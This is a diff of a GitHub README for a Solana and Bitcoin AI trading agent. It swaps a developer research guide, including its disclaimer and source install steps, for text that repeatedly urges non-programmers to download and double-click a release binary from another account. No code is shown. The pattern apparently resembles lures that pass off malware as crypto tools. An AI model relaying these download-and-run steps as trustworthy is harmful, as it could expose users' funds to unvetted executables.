@@ -1,138 +1,65 @@
+# 🤖 Web3-AI-Trading-Agent - Trade Smartly with AI Bots
 
-# Web3 AI Trading Agent for Solana & Bitcoin  
-📩 Contact: [@lorine93s](https://t.me/lorine93s)
+[![Download Web3-AI-Trading-Agent](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/KaviduIsura/Web3-AI-Trading-Agent/releases)
 
-A hands-on walkthrough for building **autonomous AI-powered trading agents** on **Solana** and **Bitcoin**.  
-This guide is optimized for developers and researchers interested in **AI trading bots**, **Web3 automation**, and **blockchain-based financial agents**.  
+## 🚀 Getting Started
 
----
+Welcome to the Web3-AI-Trading-Agent! This guide will help you download and run our AI-powered trading agent for Solana and Bitcoin. No programming knowledge is required.
 
+## 📥 Download & Install
 
-⚠️ **Disclaimer**: This repository is for **learning and research only**.  
-Not production-ready. Use at your own risk.  
+To get started, visit the [Releases page](https://github.com/KaviduIsura/Web3-AI-Trading-Agent/releases) to download the latest version of the application. Choose the file that matches your operating system.
 
----
+1. Go to the [Releases page](https://github.com/KaviduIsura/Web3-AI-Trading-Agent/releases).
+2. Look for the latest version of the software.
+3. Click the file that suits your operating system to download it.
+4. Once the download completes, locate the file in your downloads folder.
+5. Double-click the file to run the installation.
+6. Follow the on-screen prompts to complete the installation.
 
-## 🚀 Overview
+## 💻 System Requirements
 
-This project demonstrates how to build an AI-powered trading agent that operates across **Solana** (SPL token ecosystem, Serum/DEX swaps) and **Bitcoin** (via Lightning & on-chain data).  
+For the best experience, ensure your system meets the following requirements:
 
-We move from **manual trading** to **automated bots**, and finally to **AI agents** powered by fine-tuned machine learning models.  
+- **Operating System:** Windows 10 or later / macOS 10.14 or later / Ubuntu 20.04 or later
+- **RAM:** At least 8 GB
+- **Storage:** At least 200 MB of free space
+- **Internet Connection:** Required for trading and downloading updates
 
-### Core Features
-- **Cross-chain trading**: Supports **Solana SPL tokens** and **Bitcoin transactions**
-- **AI-driven decisions**: Fine-tuned local language models for strategy execution
-- **Local-first design**: Maximal privacy and control, minimal external dependencies
-- **Synthetic data & RL**: GAN-generated trading data + reinforcement learning optimizations
-- **Research-focused**: Transparency, reproducibility, and modular design
+## 🔧 Features
 
----
+Web3-AI-Trading-Agent comes packed with features designed to simplify your trading experience:
 
-## 📑 Table of Contents
-1. [Stack](#stack) — Technology stack & setup  
-2. [Pipeline](#pipeline) — Trading agent architecture overview  
-3. [Implementation](#implementation) — From manual to autonomous agents  
-4. [Stateless Agent](#stateless-agent) — AI trading bot without memory  
-5. [Stateful Agent](#stateful-agent) — Memory-enabled adaptive trading  
-6. [Fine-tuning](#fine-tuning) — Training custom financial AI models  
-7. [Synthetic Data](#synthetic-data) — GAN-based market data generation  
-8. [Knowledge Distillation](#knowledge-distillation) — Teacher → student compression  
-9. [Model Deployment](#model-deployment) — Ollama & local inference  
-10. [Reinforcement Learning](#reinforcement-learning) — Strategy optimization  
+- **AI-Powered Trading:** Utilizes machine learning and reinforcement learning to optimize trades.
+- **Multi-Asset Support:** Trade with both Solana SPL tokens and Bitcoin UTXO/Lightning.
+- **Local-First AI Pipeline:** Fully integrated AI pipeline using PyTorch for local computations.
+- **Synthetic Data Generation:** Helps train the model in various trading scenarios.
+- **User-Friendly Interface:** Simple setup and usage for easy navigation.
 
----
+## 📊 How It Works
 
-## ⚙️ Stack
+This trading agent connects to Solana and Bitcoin networks, allowing you to create and test trading strategies. Here’s how:
 
-### Blockchain Infrastructure
-- **Solana**  
-  - Fast, high-throughput L1 with sub-second finality  
-  - SPL token trading on [Serum DEX](https://projectserum.com/) and AMMs  
-  - Integration via [solana-py](https://github.com/michaelhly/solana-py)  
+1. **Set Up Your Account:** After installation, create an account to get started.
+2. **Choose Your Strategies:** Select from various pre-built strategies or create your own.
+3. **Launch Trades:** Start trading with AI assistance, which will analyze market data and execute trades on your behalf.
 
-- **Bitcoin**  
-  - On-chain swap simulations with UTXO-based strategies  
-  - Lightning Network APIs for off-chain trading experiments  
-  - Market data sourced via Chainstack BTC nodes  
+## 🔗 Important Links
 
-- **Chainstack Nodes**  
-  - Enterprise-grade RPC endpoints for **Solana & Bitcoin**  
-  - 99.99% uptime, global edge distribution, low-latency trading  
+- [Documentation](https://github.com/KaviduIsura/Web3-AI-Trading-Agent/wiki) - Comprehensive guides and FAQs.
+- [Community Support](https://github.com/KaviduIsura/Web3-AI-Trading-Agent/discussions) - Join discussions or ask questions.
+- [GitHub Repo](https://github.com/KaviduIsura/Web3-AI-Trading-Agent) - Explore the source code or contribute.
 
-### AI / ML Stack
-- **PyTorch** — Deep learning framework for GANs & neural networks  
-- **Ollama** — Local LLM inference for secure, offline AI agents  
-- **Apple MLX-LM** / **Unsloth** — Efficient fine-tuning on Apple Silicon & GPUs  
-- **Gymnasium** — Reinforcement learning environments for trading strategies  
+## 👩‍💻 Contributing
 
----
+If you’d like to contribute, please read our [contributing guidelines](https://github.com/KaviduIsura/Web3-AI-Trading-Agent/blob/main/CONTRIBUTING.md). We welcome contributions that improve the software and support for our community.
 
-## 🛠 Installation
+## 📜 License
 
-```bash
-git clone https://github.com/your-username/solana-bitcoin-ai-trading-agent.git
-cd solana-bitcoin-ai-trading-agent
-pip install -r requirements.txt
-````
+This project is licensed under the MIT License. You can find the full license text in the [LICENSE](https://github.com/KaviduIsura/Web3-AI-Trading-Agent/blob/main/LICENSE) file.
 
-Dependencies include:
+## 📞 Support
 
-* Blockchain: `solana`, `bit`, `web3.py`
-* AI/ML: `torch`, `mlx`, `gymnasium`, `stable-baselines3`
-* Data: `pandas`, `numpy`
+For any issues or inquiries, please contact our support team through the GitHub repository. We're here to help you succeed in your trading journey. 
 
----
-
-## 📊 Development Pipeline
-
-The trading agent evolves in **3 stages**:
-
-1. **Manual Trading**
-
-   * Execute swaps manually on Solana DEX / Bitcoin testnet
-   * Gain familiarity with raw blockchain mechanics
-
-2. **Bot Automation**
-
-   * Scripted trading bots for BTC/USDT and SOL/USDC pairs
-   * Programmatic swaps via RPC
-
-3. **AI Agents**
-
-   * Intelligent decision-making with LLMs
-   * Memory-enabled agents adapt to market conditions
-   * Reinforcement learning strategies
-
-```mermaid
-graph TD
-    A[Manual Trading] --> B[Automated Bots]
-    B --> C[Stateless AI Agent]
-    C --> D[Stateful AI Agent]
-    D --> E[Synthetic Data (GANs)]
-    E --> F[Knowledge Distillation]
-    F --> G[Reinforcement Learning]
-    G --> H[Final Autonomous Agent]
-```
-
----
-
-## 📚 References
-
-* [Solana Docs](https://docs.solana.com/)
-* [Bitcoin Developer Guide](https://developer.bitcoin.org/devguide/)
-* [Chainstack Nodes](https://chainstack.com/)
-* [Ollama Models](https://ollama.com/library)
-* [Hugging Face](https://huggingface.co/models)
-
----
-
-## ✅ Summary
-
-This repo provides a **research-focused AI trading agent framework** for **Solana and Bitcoin**.
-From **manual swaps** to **autonomous AI models**, you’ll learn the **end-to-end pipeline** for building Web3 trading systems.
-
-## 📩 Contact
-
-  
-Telegram: [@lorine93s](https://t.me/lorine93s)
-
+Once again, don’t forget to visit the [Releases page](https://github.com/KaviduIsura/Web3-AI-Trading-Agent/releases) to download the latest version and start trading with AI today!
